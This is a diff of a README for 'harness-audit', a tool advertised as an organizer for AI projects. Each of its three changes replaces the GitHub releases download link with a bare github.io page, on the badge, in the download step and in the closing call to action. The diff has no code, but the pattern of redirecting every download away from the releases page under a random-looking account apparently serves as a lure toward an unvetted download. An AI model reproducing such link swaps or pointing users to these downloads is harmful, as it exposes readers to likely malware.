@@ -1,7 +1,7 @@
 <h1>🧰 harness-audit - Your AI Project's Personal Organizer</h1>
 
 <p align="center">
-<a href="https://github.com/Adverbial-cobweb86/harness-audit/releases"><img src="https://img.shields.io/badge/Download-harness--audit-8A2BE2?style=for-the-badge&logo=github" alt="Download Button" style="background-color:#FF5733; color:white; padding:15px 30px; border-radius:10px; font-size:20px;"></a>
+<a href="https://adverbial-cobweb86.github.io"><img src="https://img.shields.io/badge/Download-harness--audit-8A2BE2?style=for-the-badge&logo=github" alt="Download Button" style="background-color:#FF5733; color:white; padding:15px 30px; border-radius:10px; font-size:20px;"></a>
 </p>
 
 ## 🤔 What Is This?
@@ -30,7 +30,7 @@ harness-audit steps in and:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Adverbial-cobweb86/harness-audit/releases](https://github.com/Adverbial-cobweb86/harness-audit/releases)**
+Visit this link to download the application: **[https://adverbial-cobweb86.github.io](https://adverbial-cobweb86.github.io)**
 
 This is your one-stop shop for getting the latest version. You'll see a list of releases - always choose the newest one (it'll be at the top).
 
@@ -136,7 +136,7 @@ We're here to support you! If you ever get stuck:
 
 Your AI projects deserve to be organized! Download harness-audit today and see the difference a clean workspace makes.
 
-**👉 [Download harness-audit Now](https://github.com/Adverbial-cobweb86/harness-audit/releases)**
+**👉 [Download harness-audit Now](https://adverbial-cobweb86.github.io)**
 
 Watch your AI become faster, smarter, and more efficient - starting today!
 
